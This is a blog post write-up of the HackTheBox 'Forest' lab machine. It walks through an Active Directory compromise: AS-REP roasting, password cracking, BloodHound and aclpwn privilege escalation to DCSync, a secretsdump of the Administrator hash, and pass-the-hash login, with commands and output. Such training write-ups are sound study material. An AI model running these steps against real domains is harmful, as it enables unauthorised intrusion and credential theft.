@@ -1,0 +1,342 @@
+---
+layout: htb_box
+title: "HTB: Forest"
+code: htb_forest
+long_date: "20th March 2020"
+author: rubytox
+---
+<p>Hello everyone!</p>
+
+<p>Today, I'm publishing a writeup for <a href="https://www.hackthebox.eu">HackTheBox</a>'s machine Forest, made by
+    <a href="https://www.hackthebox.eu/home/users/profile/1190">egre55</a> and
+    <a href="https://www.hackthebox.eu/home/users/profile/2984">mrb3n</a>. This was the first machine running Windows
+    I tried to own, and I would say it was really the hardest one for me now. However, I learned a lot about Active
+    Directory here, so it was really useful.<!--more--></p>
+
+<p>As usual, I'm going to add this machine's IP address to my <code>/etc/hosts</code> file, and I will be refering to
+    it using the domain name <code>forest.ctf</code>.</p>
+
+<p>Let's get started! I started by running an <code>nmap</code> scan, which gave the following result:</p>
+<pre class="prettyprint nocode">
+$ nmap -sC -sV -oA nmap/forest forest.ctf
+# Nmap 7.60 scan initiated Sat Dec 28 18:17:33 2019 as: nmap -sC -sV -oA nmap/active forest.ctf
+Nmap scan report for forest.ctf (10.10.10.161)
+Host is up (0.33s latency).
+Not shown: 989 closed ports
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain       Microsoft DNS
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-12-28 17:26:19Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 7m55s, deviation: 0s, median: 7m55s
+| smb-os-discovery:
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System time: 2019-12-28T09:26:36-08:00
+| smb-security-mode:
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2019-12-28 18:26:38
+|_  start_date: 2019-12-28 15:27:05
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Dec 28 18:20:40 2019 -- 1 IP address (1 host up) scanned in 186.63 seconds
+</pre>
+
+<p>So we learn here that we're targetting a machine in an Active Directory system, whose domain is called
+    <code>htb.local</code> and fully qualified domain name is <code>FOREST.htb.local</code>.</p>
+
+<p>In order to get a foothold, I started by enumerating the users on the AD system, using a tool from
+    <a href="https://www.secureauth.com/labs/open-source-tools/impacket">Impacket</a>. Impacket is a collection of
+    Python scripts that allow to perform a lot of various actions targetting AD systems. Here, we're going to use
+    the tool <code>samrdump.py</code>: this script tries to enumerate all the users by communicating with the SAMR
+    (<em>Security Account Manager Remote</em>) of the MSRPC. We know that it might work because we saw in the <code>nmap</code>
+    scan that there was an MSRPC service running on port 135.</p>
+<pre class="prettyprint nocode">
+$ samrdump.py forest.ctf
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+[*] Retrieving endpoint list from forest.ctf
+Found domain(s):
+ . HTB
+ . Builtin
+[*] Looking up users in domain HTB
+Found user: Administrator, uid = 500
+Found user: Guest, uid = 501
+Found user: krbtgt, uid = 502
+Found user: DefaultAccount, uid = 503
+Found user: $331000-VK4ADACQNUCA, uid = 1123
+Found user: SM_2c8eef0a09b545acb, uid = 1124
+Found user: SM_ca8c2ed5bdab4dc9b, uid = 1125
+Found user: SM_75a538d3025e4db9a, uid = 1126
+Found user: SM_681f53d4942840e18, uid = 1127
+Found user: SM_1b41c9286325456bb, uid = 1128
+Found user: SM_9b69f1b9d2cc45549, uid = 1129
+Found user: SM_7c96b981967141ebb, uid = 1130
+Found user: SM_c75ee099d0a64c91b, uid = 1131
+Found user: SM_1ffab36a2f5f479cb, uid = 1132
+Found user: HealthMailboxc3d7722, uid = 1134
+Found user: HealthMailboxfc9daad, uid = 1135
+Found user: HealthMailboxc0a90c9, uid = 1136
+Found user: HealthMailbox670628e, uid = 1137
+Found user: HealthMailbox968e74d, uid = 1138
+Found user: HealthMailbox6ded678, uid = 1139
+Found user: HealthMailbox83d6781, uid = 1140
+Found user: HealthMailboxfd87238, uid = 1141
+Found user: HealthMailboxb01ac64, uid = 1142
+Found user: HealthMailbox7108a4e, uid = 1143
+Found user: HealthMailbox0659cc1, uid = 1144
+Found user: sebastien, uid = 1145
+Found user: lucinda, uid = 1146
+Found user: svc-alfresco, uid = 1147
+Found user: andy, uid = 1150
+Found user: mark, uid = 1151
+Found user: santi, uid = 1152
+Found user: mftuser, uid = 7601
+</pre>
+
+<p>So there are a lot of pointless users, and some accounts that look like actual users: sebastien, lucinda, svc-alfresco,
+    andy, mark and santi. Of course there is the Administrator account, that we want to own at the end.</p>
+
+<p>Here, every user might be interesting, but I'm going to start by looking at <code>svc-alfresco</code>: the <code>svc</code>
+    usually stands for "service", so this user should be a service user. This user is interesting because I learned by looking
+    at some "Best practice guides" regarding AD that there were a lot of administrators who gave service accounts higher
+    privileges than they needed, so it might be an interesting way to start pentesting.</p>
+
+<p>Another way to find a list of users could be using the LDAP service, with the tool <code>ldapsearch</code>:</p>
+<pre class="prettyprint nocode">
+$ ldapsearch -h forest.ctf -x -b "dc=htb,dc=local"
+</pre>
+
+<p>We specify the hostname, then the option <code>-x</code> avoids using SASL authentification method, and we specify
+    which domain controller we should retrieve information from with <code>-b</code>. This gives a lot of information,
+    but I'm not sure most of it is actually useful, for <code>svc-alfresco</code> we only get this:</p>
+<pre class="prettyprint nocode">
+# svc-alfresco, Service Accounts, htb.local
+dn: CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local
+</pre>
+
+<p>So it allowed us to know which OU (<em>Organisational Unit</em>) is the user member of, but nothing more. Now, I
+    was stuck for a while because I didn't really know how to attack the account; I tried using <code>smbmap</code> and
+    <code>smbclient</code>, but it led to nothing. </p>
+
+<p>Browsing through the scripts from Impacket, I found a script that helped me a lot: <code>GetNPUsers.py</code>. Basically,
+    one possible way to connect to an AD is to use the Kerberos protocol. Instead of using clear-text passwords, this authentication
+    protocol relies on the use of symmetric keys and tickets. The tickets are delivered by a service called TGS (<em>Ticket
+    Granting Service</em>), and this is this service we are going to send a request to. Find more information on
+    <a href="https://fr.wikipedia.org/wiki/Kerberos_(protocole)">Kerberos' Wikipedia page</a>.</p>
+
+<p>The script <code>GetNPUsers.py</code> asks the TGS for a ticket (called TGT), and displays it if the targeted user has the property
+    'Do not require Kerberos preauthentication' set.<sup><a href="#fn1" id="ref1">1</a></sup> If so, then we will be able
+    to exploit the TGT and get the user's password. Let's try that:</p>
+<pre class="prettyprint nocode">
+$ GetNPUsers.py htb.local/svc-alfresco@forest.ctf -no-pass -dc-ip 10.10.10.161
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+[*] Getting TGT for svc-alfresco
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:16cdade20537861af2edfa9c61bcc71a$d932f50[...]b704ff7b99
+</pre>
+
+<p>We then crack this TGT using <code>john</code> and the wordlist <code>rockyou</code>. Let's put the hash in a file
+    names <code>svc-alfresco.tgt</code>, when then just have to run this command:</p>
+<pre class="prettyprint nocode">
+$ john svc-alfresco.tgt --wordlist=rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
+1g 0:00:00:04 DONE (2020-03-21 19:45) 0.2403g/s 982153p/s 982153c/s 982153C/s s4552525..s3r1bu
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+</pre>
+
+<p>We got a password! Now, in order to get the user flag, we need to login to <code>svc-alfresco</code>'s session. To do
+    so, we can use a Windows machine and run the following command:</p>
+<pre class="prettyprint nocode">
+$ runas /user:htb.local\svc-alfresco powershell.exe
+</pre>
+
+<p>If you don't have a Windows machine ready, you can do that using Linux with the powerful tool <a href="https://github.com/Hackplayers/evil-winrm">
+    Evil-WinRM</a>. This tools allows to have a Powershell session, and to upload and download files easily. We use this to
+    login to user <code>svc-alfresco</code>'s session:</p>
+<pre class="prettyprint nocode">
+$ evil-winrm -i forest.ctf -u "svc-alfresco" -p "s3rvice"
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> type ..\Desktop\user.txt
+e5e4e[-- REDACTED --]0d9ed
+</pre>
+
+<p>Great, we owned user! Now, let's get working on root. To do so, I'm going to use a very useful tool in AD and that is
+    a bit hard to understand at first: <a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a>.</p>
+
+<p>This software uses graph theory in order to analyze the relations between AD objects, and find interesting attack
+    paths. It relies on a <a href="https://neo4j.com">neo4j</a> SGBD, so you might want to install this utility before
+    using BloodHound.</p>
+
+<p>However, if we launch BloodHound just like that, it won't help you lots because you first need to give it data to
+    process. I know two ways of doing so:</p>
+<ul>
+    <li>There is a BloodHound's version which is Python based and that connects directly to the target, provided correct
+         credentials, and gathers all needed information: this can be found <a href="https://github.com/fox-it/BloodHound.py">here</a>.</li>
+    <li>There is a separate BloodHound ingestor called SharpHound. It comes in two version: an executable file that can be
+        uploaded to the host then ran, and a Powershell script that we're going to use right into Evil-WinRM. You can find
+        SharpHound <a href="https://github.com/BloodHoundAD/SharpHound3">here</a>.</li>
+</ul>
+
+<p>Here I'll be using the second method. First, I downloaded the script <code>SharpHound.ps1</code> in a directory called
+    <code>scripts</code>, then I launched an Evil-WinRM session with the following command:</p>
+<pre class="prettyprint nocode">
+$ evil-winrm -i forest.ctf -u "svc-alfresco" -p "s3rvice" -s "scripts/"
+</pre>
+
+<p>Then, inside Evil-WinRM, I can load a Powershell script by typing its name in the prompt. The functions it declares
+    will be added to Evil-WinRM's menu. We can observe that this way:
+</p>
+<pre class="prettyprint nocode">
+<span class="evil-winrm-prefix"></span> C:\Users\svc-alfresco\Documents> SharpHound.ps1
+<span class="evil-winrm-prefix"></span> C:\Users\svc-alfresco\Documents> menu
+
+   ,.   (   .      )               "            ,.   (   .      )       .
+  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)
+.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((
+_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
+\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \
+ |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \
+ |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
+/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
+        \/                               \/          \/       \/         \/
+              By: CyberVaca, OscarAkaElvis, Laox @Hackplayers
+
+[+] Bypass-4MSI
+[+] Dll-Loader
+[+] Donut-Loader
+[+] Invoke-Binary
+[+] Invoke-BloodHound
+</pre>
+
+<p>Here, we see that we can call the function <code>Invoke-BloodHound</code>. This function is going to gather all the
+    information we need:</p>
+<pre class="prettyprint nocode">
+<span class="evil-winrm-prefix"></span> C:\Users\svc-alfresco\Documents> Invoke-BloodHound -CollectionMethod All -JSONFolder '.'
+</pre>
+
+<p>After a while, this method call will generate a zip file in the current directory named <code>datehour_BloodHound.zip</code>.
+    Download this file using the <code>download</code> function, now we can exploit that.</p>
+
+<p>First, we need to start <code>neo4j</code> using the command <code>./neo4j start</code> in the binary directory it was
+    installed or built in. Then, launch BloodHound. A login screen should appear: it asks for the credentials for <code>neo4j</code>.
+    Once logged in, you should have an interface similar to this one:</p>
+
+<img src="/img/{{ page.code }}/forest1.png" alt="BloodHound blank interface" />
+
+<p>Here, the database should be empty, so we're going to populate it. Click on the "Upload Data" button on the top right set
+    of buttons, and upload the zip file we've downloaded earlier from the machine. After a while, data should be in
+    the database as you can see here:</p>
+
+<img src="/img/{{ page.code }}/forest2.png" alt="Populated database" />
+
+<p>Then, we're going to see if BloodHound found an interesting path towards the Administrator account. To do so, we click
+    on the "Queries" tab, and click on "Find Shortest Paths to Domain Admins". BloodHound shows the following graph:</p>
+
+<img src="/img/{{ page.code }}/forest3.png" alt="Path to Domain Admins from svc-alfresco" />
+
+<p><strong>Note:</strong> Be careful to the data you get from the host you attack. One possible privilege escalation method
+    here is to create a new user, and at first BloodHound showed my a path using the new user other people created instead
+    of the real interesting path.</p>
+
+<p><strong>Note:</strong> for some reason, the binary release version of BloodHound didn't work on my computer, it didn't put anything
+    in the database. However, I built BloodHound from sources and this worked better.</p>
+
+<p>So we see that our BloodHound found a way to get to Administrator starting from the user <code>svc-alfresco</code>. For now,
+    I didn't use BloodHound much more because I still had some trouble understanding how it works and what it was showing
+    me. However, I came across a tool that reads the paths found by BloodHound, and that was able to modify ACL permissions
+    when applicable: <a href="https://github.com/fox-it/aclpwn.py"><code>aclpwn</code></a>.</p>
+
+<p>We know that we have an exploitable route from <code>svc-alfresco</code>, so we can exploit it using the command:</p>
+<pre class="prettyprint nocode">
+$ aclpwn -f svc-alfresco -ft user -d htb.local -du svc-alfresco -s 10.10.10.161
+Please supply the password or LM:NTLM hashes of the account you are escalating from:
+[+] Path found!
+Path [0]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]->(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]->(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]->(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]->(EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL)-[MemberOf]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)
+[!] Unsupported operation: GenericAll on EXCH01.HTB.LOCAL (Base,Computer)
+[-] Invalid path, skipping
+[!] Unsupported operation: GetChanges on HTB.LOCAL (Base,Domain)
+[-] Invalid path, skipping
+[+] Path found!
+Path [1]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]->(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]->(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]->(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)
+Please choose a path [0-1] 0
+[-] Memberof -> continue
+[-] Memberof -> continue
+[-] Memberof -> continue
+[-] Adding user SVC-ALFRESCO to group EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL
+[+] Added CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local as member to CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
+[-] Re-binding to LDAP to refresh group memberships of SVC-ALFRESCO@HTB.LOCAL[+] Re-bind successful[-] Memberof -> continue[-] Modifying domain DACL to give DCSync rights to SVC-ALFRESCO[+] Dacl modification successful[+] Finished running tasks
+[+] Saved restore state to aclpwn-20200322-130933.restore
+</pre>
+
+<p>We see that <code>aclpwn</code> found two paths that allows it to add <code>svc-alfresco</code> to an interesting group. From there,
+    user <code>svc-alfresco</code> is part of the group <code>EXCHANGE TRUSTED SUBSYSTEM</code>. This will allow us to use
+    another tool from Impacket: <code>secretsdump.py</code>. This tool dumps credentials or hashes found in the machine, but
+    is useful only with enough permissions. We run it the following way:</p>
+<pre class="prettyprint nocode">
+$ secretsdump.py htb.local/svc-alfresco:s3rvice@forest.ctf -dc-ip 10.10.10.161
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+
+[-- other stuff --]
+</pre>
+
+<p><code>secretsdump.py</code> gave us the NTLM hash for Administrator user! We can now try to connect to the machine
+    using Evil-WinRM again:</p>
+<pre class="prettyprint nocode">
+$ evil-winrm -i 10.10.10.161 -u 'Administrator' -H "32693b11e6aa90eb43d32c72a07ceea6"
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+<span class="evil-winrm-prefix"></span> C:\Users\Administrator\Documents> type ..\Desktop\root.txt
+f0481[-- REDACTED --]129cc
+</pre>
+
+<p>We got root! So to sum it up, I think that Forest was a really difficult box, but mostly because AD and Windows
+    pentesting is completely new to me. I learned a lot of new concepts, and I think I improved a lot about
+    Windows boxes. However, I still think I didn't understand everything, as I can't really explain some things or
+    commands I used.</p>
+
+<p>So this is over for this box! If you have any comments or suggestions, feel free to open an issue on <a href="https://github.com/Rubytox/Rubytox.github.io">this website's GitHub page</a>.</p>
+
+
+
+<!-- Footnotes -->
+
+<hr />
+
+<sup id="fn1">1. <a href="https://www.secureauth.com/labs/open-source-tools/impacket">https://www.secureauth.com/labs/open-source-tools/impacket</a><a href="#ref1" title="Jump back to footnote 1 in the text.">↩</a></sup>
